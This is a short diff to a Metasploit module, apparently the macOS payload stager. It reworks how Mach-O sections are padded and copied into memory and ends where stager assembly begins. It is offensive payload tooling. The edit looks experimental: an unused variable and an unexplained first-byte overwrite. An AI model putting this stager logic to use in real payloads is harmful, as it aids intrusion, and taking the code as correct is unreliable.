@@ -39,15 +39,21 @@ module MetasploitModule
       for section in segment.sections
         file_section = segment.fileoff + section.offset
         vm_addr = section.addr - 0x100000000
-        section_data = data[file_section, section.size]
-        if output_data.size < vm_addr
-          output_data += "\x00" * (vm_addr - output_data.size)
+        if data.size < vm_addr + section.size
+          data += "\x00" * (vm_addr + section.size - data.size)
         end
-        if section_data
-          output_data[vm_addr, output_data.size] = section_data
-        end
+        #section_data = data[file_section, section.size]
+        #if output_data.size < vm_addr
+          #output_data += "\x00" * (vm_addr - output_data.size)
+        #end
+        #if section_data
+          #output_data[vm_addr, output_data.size] = section_data
+        #end
       end
     end
+
+    output_data = data
+    output_data[0] = 'c'
 
     midstager_asm = %(
       push rdi                    ; save sockfd
